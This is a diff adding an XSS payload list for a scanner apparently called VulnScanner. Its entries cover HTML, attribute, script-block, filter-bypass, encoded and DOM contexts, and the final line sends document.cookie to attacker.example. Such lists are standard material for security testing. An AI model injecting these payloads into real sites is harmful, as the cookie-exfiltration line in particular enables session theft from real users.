@@ -1,0 +1,52 @@
+# XSS Payloads — VulnScanner reference list
+# Usage: python main.py -u "..." --scan-type xss --payloads payloads/xss.txt
+#
+# Format: one payload per line.  Lines starting with # are ignored.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── HTML context — basic ──────────────────────────────────────────────────
+<script>alert(1)</script>
+<script>alert("XSS")</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href=javascript:alert(1)>XSS</a>
+
+# ── Attribute context (inject after closing a quote) ──────────────────────
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+" onclick="alert(1)
+" onerror="alert(1)
+" onblur="alert(1)
+"><img src=x onerror=alert(1)>
+
+# ── Script block context (break out of existing <script>) ────────────────
+</script><script>alert(1)</script>
+";alert(1)//
+';alert(1)//
+\";alert(1)//
+\';alert(1)//
+
+# ── Filter bypass / case mixing ──────────────────────────────────────────
+<sCrIpT>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<img/src=x onerror=alert(1)>
+<<script>alert(1)//<</script>
+<img src=x oNeRrOr=alert(1)>
+
+# ── Encoded variants ─────────────────────────────────────────────────────
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=alert(1)>
+javascript:alert(1)
+
+# ── DOM-based context seeds ───────────────────────────────────────────────
+<img src=x onerror=alert(document.location)>
+<svg onload="fetch('https://attacker.example/'+document.cookie)">
